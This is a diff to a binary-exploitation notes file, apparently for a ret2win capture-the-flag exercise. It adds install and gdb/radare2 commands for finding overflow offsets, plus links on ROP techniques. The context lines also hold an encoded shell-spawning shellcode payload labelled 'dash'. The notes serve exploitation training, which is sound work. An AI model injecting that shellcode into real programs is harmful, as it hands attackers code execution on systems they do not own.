@@ -18,12 +18,72 @@
 
 </br>
 
+
+### Radare2 
+
+```
+git clone https://github.com/radare/radare2
+cd radare2; sys/install.sh
+```
+```
+r2 ret2win 
+aaaa
+afl
+pdf @ sym.pwn 
+
+```
+### gdb/Peda 
+
+```
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+```
+```
+gdb ret2win 
+pattern_create 200
+r
+pattern offset AA0AAFAAb
+pdisass pwnme
+x/16xg $sp
+x/10s *environ
+b *0x0000000000400753
+starti
+si
+```
+
+
+### ropper 
+
+```
+apt install python-pip
+pip install ropper
+```
+
+### pwn 
+
+```
+pip install --upgrade pip
+pip install --upgrade pwntools
+```
+
+
+###
+
+Cheatsheet:
+
+https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png
+
+Rop tricks 
+https://trustfoundry.net/basic-rop-techniques-and-tricks/
+
 ### Payloads
 
 #### dash
 ````
 "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
 ````
+
+
 
 </br>
 
